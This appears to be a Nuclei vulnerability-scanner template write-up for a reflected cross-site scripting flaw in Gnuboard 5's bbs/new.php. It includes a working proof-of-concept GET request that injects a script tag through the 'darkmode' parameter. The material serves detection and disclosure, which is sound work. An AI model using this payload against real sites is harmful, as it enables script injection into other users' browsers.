# Nuclei Template: Gnuboard 5 - Cross-Site Scripting
**Template ID:** gnuboard5-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`gnuboard5-xss.yaml`)

## Vulnerability Information & PoC

## Description
Gnuboard 5 contains a cross-site scripting vulnerability via the clean_xss_tags() function called in new.php.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/bbs/new.php?darkmode=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
```

## References
- https://huntr.dev/bounties/ad2a9b32-fe6c-43e9-9b05-2c77c58dde6a/
